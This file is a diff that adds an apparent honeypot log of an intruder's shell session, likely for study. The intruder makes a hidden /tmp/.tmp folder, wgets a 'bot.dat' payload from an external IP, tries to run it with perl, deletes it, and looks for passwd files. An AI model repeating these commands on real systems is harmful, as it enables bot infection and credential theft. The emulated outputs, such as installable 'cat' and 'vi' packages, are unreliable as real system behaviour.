@@ -1,0 +1,189 @@
+[4hAWSWeb:~# ls -lia
+[4ldrwxr-xr-x 1 root root 4096 2013-04-11 15:13 .
+drwxr-xr-x 1 root root 4096 2013-04-11 15:13 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# perl
+bash: perl: command not found
+AWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~#  wget[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd [1D[1P[1D[1P[1D[1Pcd ..
+[4l[4hAWSWeb:/# cd ..
+[4l[4hAWSWeb:/# cd tmp
+[4l[4hAWSWeb:/tmp# mkdir .tmp
+[4l[4hAWSWeb:/tmp# cd .tmp
+[4l[4hAWSWeb:/tmp/.tmp# wget http://89.202.127.19/icons/guga/bot.dat
+[4l--2013-04-11 15:14:01--  http://89.202.127.19/icons/guga/bot.dat
+Connecting to 89.202.127.19:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 33403 (32K) [video/mpeg]
+Saving to: `bot.dat
+
+ 3% [=>                                     ] 1,164        5K/s  eta 5s100%[======================================>] 33,403       5K/s
+
+2013-04-11 15:14:02 (5 KB/s) - `bot.dat' saved [33403/33403]
+[4hAWSWeb:/tmp/.tmp# perl bot.dat
+bash: perl: command not found
+AWSWeb:/tmp/.tmp# apt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 301.2kB of archives.
+After this operation, 662.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.34-9 [301.2kB]
+Fetched 301.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.34-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.34-9) ...
+[4hAWSWeb:/tmp/.tmp# [Kapt-get install perl[20D[Kperl bot.dat
+[4lperl: Segmentation fault
+[4hAWSWeb:/tmp/.tmp# [Kperl bot.dat[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm -rf bot.dat
+[4l[4hAWSWeb:/tmp/.tmp# cd ..
+[4l[4hAWSWeb:/tmp# cd ..
+[4l[4hAWSWeb:/# di[1D[1P[1D[1Pls -lia
+[4ldrwxr-xr-x 1 root root  4096 2013-04-11 15:16 .
+drwxr-xr-x 1 root root  4096 2013-04-11 15:16 ..
+drwxr-xr-x 1 root root     0 2009-11-20 08:19 sys
+drwxr-xr-x 1 root root  4096 2009-11-08 15:42 bin
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 mnt
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 media
+lrwxrwxrwx 1 root root    25 2009-11-06 11:16 vmlinuz -> /boot/vmlinuz-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 opt
+lrwxrwxrwx 1 root root    11 2009-11-06 11:08 cdrom -> /media/cdrom0
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 selinux
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 tmp
+dr-xr-xr-x 1 root root     0 2009-11-20 08:19 proc
+drwxr-xr-x 1 root root  4096 2009-11-08 15:41 sbin
+drwxr-xr-x 1 root root  4096 2009-11-20 08:20 etc
+drwxr-xr-x 1 root root  3200 2009-11-20 08:20 dev
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 srv
+lrwxrwxrwx 1 root root    28 2009-11-06 11:16 initrd.img -> /boot/initrd.img-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 lib
+drwxr-xr-x 1 root root  4096 2009-11-06 11:22 home
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 var
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 usr
+drwxr-xr-x 1 root root  4096 2009-11-08 15:39 boot
+drwxr-xr-x 1 root root  4096 2009-11-20 09:08 root
+drwx------ 1 root root 16384 2009-11-06 11:08 lost+found
+[4hAWSWeb:/# cd usr
+[4l[4hAWSWeb:/usr# ls -lia
+[4ldrwxr-xr-x 1 root root  4096 2013-04-11 15:16 .
+drwxr-xr-x 1 root root  4096 2013-04-11 15:16 ..
+drwxr-xr-x 1 root root 12288 2009-11-08 15:46 bin
+drwxrwxr-x 1 root 40  4096 2009-11-06 11:08 src
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 include
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 X11R6
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 sbin
+drwxrwxr-x 1 root 50  4096 2009-11-06 11:09 local
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 lib
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 share
+drwxr-xr-x 1 root root  4096 2009-11-08 15:33 games
+[4hAWSWeb:/usr# cd share
+[4l[4hAWSWeb:/usr/share# ls -lia
+[4ldrwxr-xr-x 1 root root 4096 2013-04-11 15:16 .
+drwxr-xr-x 1 root root 4096 2013-04-11 15:16 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 debconf
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 dict
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 lintian
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 linda
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 tabset
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 common-licenses
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 base-files
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 initrd-tools
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 applications
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 base-passwd
+drwxr-xr-x 1 root root 4096 2009-11-06 11:10 initramfs-tools
+drwxr-xr-x 1 root root 4096 2009-11-08 15:44 locale
+drwxr-xr-x 1 root root 4096 2009-11-08 15:29 vim
+drwxr-xr-x 1 root root 4096 2009-11-08 15:46 ssh
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 dpkg
+drwxr-xr-x 1 root root 4096 2009-11-08 15:46 doc
+drwxr-xr-x 1 root root 4096 2009-11-08 15:41 info
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 keyrings
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 readline
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 apt
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 bug
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 pixmaps
+drwxr-xr-x 1 root root 4096 2009-11-08 15:46 adduser
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 gnupg
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 perl5
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 ifupdown
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 python
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 initscripts
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 e2fsprogs
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 pam
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 sysvinit
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 binfmts
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 doc-base
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 menu
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 misc
+drwxr-xr-x 1 root root 4096 2009-11-06 11:15 zoneinfo
+drwxr-xr-x 1 root root 4096 2009-11-08 15:41 man
+drwxr-xr-x 1 root root 4096 2009-11-08 15:46 X11
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 file
+drwxr-xr-x 1 root root 4096 2009-11-08 15:45 apps
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 debianutils
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 terminfo
+drwxr-xr-x 1 root root 4096 2009-11-06 11:08 perl
+[4hAWSWeb:/usr/share# cd basepasswd
+[4lbash: cd: basepasswd: No such file or directory
+[4hAWSWeb:/usr/share# ba[1D[1P[1D[1P[Kcd basepasswd[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P-passwd
+[4l[4hAWSWeb:/usr/share/base-passwd# dir
+bash: dir: command not found
+AWSWeb:/usr/share/base-passwd# ls -lia
+[4ldrwxr-xr-x 1 root root 4096 2013-04-11 15:18 .
+drwxr-xr-x 1 root root 4096 2013-04-11 15:18 ..
+-rw-r--r-- 1 root root 446 2009-11-06 11:09 group.master
+-rw-r--r-- 1 root root 716 2009-11-06 11:09 passwd.master
+[4hAWSWeb:/usr/share/base-passwd# cat passwd.master
+[4lcat: /usr/share/base-passwd/passwd.master: No such file or directory
+[4hAWSWeb:/usr/share/base-passwd# cd passwd.master
+[4l-bash: cd: /usr/share/base-passwd/passwd.master: Not a directory
+[4hAWSWeb:/usr/share/base-passwd# apt-get install cat
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  cat 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 150.2kB of archives.
+After this operation, 330.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main cat 0.11-7 [150.2kB]
+Fetched 150.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking cat (from .../archives/cat_0.11-7_i386.deb) ...
+Processing triggers for man-db ...
+Setting up cat (0.11-7) ...
+[4hAWSWeb:/usr/share/base-passwd# [Kapt-get install cat[19D[Kcd passwd.master
+[4l-bash: cd: /usr/share/base-passwd/passwd.master: Not a directory
+[4hAWSWeb:/usr/share/base-passwd# apt-get inta[1D[1P[1D[1Pstall vi
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  vi 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 370.2kB of archives.
+After this operation, 814.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main vi 1.39-10 [370.2kB]
+Fetched 370.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking vi (from .../archives/vi_1.39-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up vi (1.39-10) ...
+[4hAWSWeb:/usr/share/base-passwd# vi passwd.master
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/usr/share/base-passwd# 
